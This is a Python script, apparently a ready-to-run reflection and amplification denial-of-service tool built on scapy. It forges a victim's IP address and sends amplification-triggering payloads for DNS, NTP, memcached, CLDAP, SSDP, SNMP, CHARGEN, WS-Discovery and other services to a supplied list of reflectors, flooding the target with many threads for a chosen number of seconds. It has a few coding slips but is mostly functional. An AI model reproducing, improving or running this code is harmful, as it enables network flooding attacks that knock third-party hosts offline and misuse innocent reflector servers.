import time, sys, os, random, threading
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_vuln = []
_wsd = [
    '<s:Envelope><s:Header><a:MessageID>a</a:MessageID></s:Header><s:Body><d:Probe><d:Types>wsdp:Device</d:Types></d:Probe></s:Body></s:Envelope>',
    '<:Envelope><:Header><:MessageID>a</:MessageID></:Header><:Body><:Probe></:Probe></:Body></:Envelope>',
    '<Envelope><Body><Probe></Probe></Body></Envelope>'
]

def _mix(_victim):
    global _vuln, _wsd
    _Server, _prt = '127.0.0.1', 80
    i = 0

    while _abort == False:
        try:
            try:
                entry = _vuln[i]
                _Server, _prt = entry.strip().split(':')
            except:
                _Server, _prt = '127.0.0.1', '80'
            
            pkt = IP()
            payload = b''
            
            if int(_prt) == 53: # DNS
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname='www.example.com',qclass="IN",qtype="A"))
            
            elif int(_prt) == 520: # RIP
               payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10'
               packet = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=520) / payload
            
            elif (int(_prt) == 37777 or int(_prt) ==37778 or int(_prt) ==37810): # DVR
               payload = b'\x44\x48\x49\x50'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=int(_prt)) /  payload #Raw(load=payload)
            
            elif int(_prt) == 3702: # WS-DISCOVERY
               payload = random.choice(_wsd)
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=3702)/ payload.encode()
            
            elif int(_prt) == 11211: # MEMCACHE
               payload = b'\x00\x00\x00\x00\x00\x01\x00\x00get injected\r\n'
               #          '\x00\x01\x00\x00\x00\x01\x00\x00get injected\n'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=11211) / Raw(load=payload)
            
            elif int(_prt) == 1433: # MSSQL
               payload = b'\x02'
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=1434)/ payload #Raw(load=payload)
            
            elif int(_prt) == 123: # NTP
               payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'    # or "\x17\x00\x03\x2a" + "\x00" * 4
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=random.randint(2000,65535), dport=123)/Raw(load=payload)
            
            elif int(_prt) == 389: # CLDAP
               payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                          b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=389) / payload
               
            elif int(_prt) == 636: # LDAP alt
               payload = (b'\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00'
                          b'\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63'
                          b'\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=636) / payload
            
            elif int(_prt) == 19: # CHARGEN
                payload = b'\x01'
                pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=19)/ Raw(load=payload)
            
            elif int(_prt) == 3389: # RDP
               payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=3389) / payload
            
            elif int(_prt) == 1900: # SSDP
               payload = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=1900,dport=1900) / Raw(load=payload)
            
            elif int(_prt) == 161: # SNMP
               payload = "\x30\x37\x02\x01" #snmp
               payload += "\x01" #v2
               payload += "\x04\x06\x70\x75\x62\x6c\x69\x63" #community=public
               payload += "\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00" #getBulkRequest
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=161,dport=161)/Raw(load=payload)
            
            elif int(_prt) == 10001: # UBIQUITI
               payload = b'\x01\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=10001) / payload
            
            elif int(_prt) == 3283: # ARD
               payload = b'\x00\x14\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=3283) / payload
               
            elif int(_prt) == 1234: # Adware reflectors
               payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(1000, 4096)))
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=1234) / payload.encode()

            else:
               payload = b'disrespect = disconnect'
               pkt = IP(src='69.420.13.37', dst=_victim) / UDP(sport=RandShort(), dport=80) / payload
            
            send(pkt, verbose=False)
            
            i+=1
            if i == len(_vuln):
                i = 0
        except KeyboardInterrupt:
            pass
    
    
def _rslv():
    _host = sys.argv[1]
    if not (_host.lower().startswith('http://') or _host.lower().startswith('https://')):
        _host = 'http://' + _host
    try:
        _domain = urlparse(_host).netloc
        _addr = socket.gethostbyname(_domain)
        return _addr
    except:
        sys.exit('\r\n DNS resolution error! Revalidate host.\r\n')


def main():
    os.system('clear')
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <target> <reflectors.txt [ip:port]> <time> <threading>\r\n')
        
    # ensure script has admin priviliges
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')
    
    global _abort, _wsd
    # url/domain -> ip
    _ip = _rslv()
    
    # add ip:port to list
    print(' Importing reflector list. Please stand-by...\r\n')
    try:
        with open(sys.argv[2], "r") as f:
            for line in f:
                if "\n" in line:
                    # remove any carriage return/s
                    line = line.replace("\n", "")
                    _vuln.append(line)
                else:
                    _vuln.append(line)
    except KeyboardInterrupt:
        sys.exit('\r\n Aborted by user.')
    except: #FileNotFoundError:
        sys.exit('\r\n Critical error encountered!\r\n')
    
    # thread execution
    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_mix, args=(_ip,))
        tasks.append(x)
        x.start()
        
    # disrespect = disconnect
    print("""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
                 ▄██                
               ▄█████               
              ████████              
             ░░████████             
              ░░████████            
             ▄▄░░████████           
           ▄████░░████████          
          ███████░░████████         
         ░░███████░░████████        
          ░░███████░░████████       
         ▄▄░░███████░░████████      
       ▄████░░███████░░████████     
     ▄███████░░███████░░████████    
    ░▀████████░░███████░░████████   
     ░░░░░░░░░█░█░░░░░░█░░░░░░░░            
            ░░█░▀    ░░█            
    ▄▄ ▄   ▄▄░█ ▄   ▄▄░█   ▄▄ ▄ ▄██▄
  ▄█████ ▄█████░█ ▄█████░▄█████░█░▀█
 ░█▀░░▀█░█▀░░▀█░█░█▀░░▀█░█▀░░▀█░▀█▄ 
░░█  ░░█░█  ░░█░█░█  ░░█░█  ░░█ ░░██
░░█▄ ░▄█░█▄ ░▄█░█░█▄ ░▄█░█▄ ░▄█ █▄░█
░░▀███▀█░░▀██▀█░█░░▀██▀█░░▀██▀█░▀██▀
 ░░░░░░░ ░░░ ░░░ ░░░░░░ ░░░░░░░ ░░
""")
    print(' Disrespect = Disconnect ~ Hammering ' + _ip + ' for ' + sys.argv[3] + ' seconds...\r\n')
    
    # wait duration of attack
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass

    # power-down threads
    _abort = True
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done.\r\n')
    
if __name__ == "__main__":
    main()
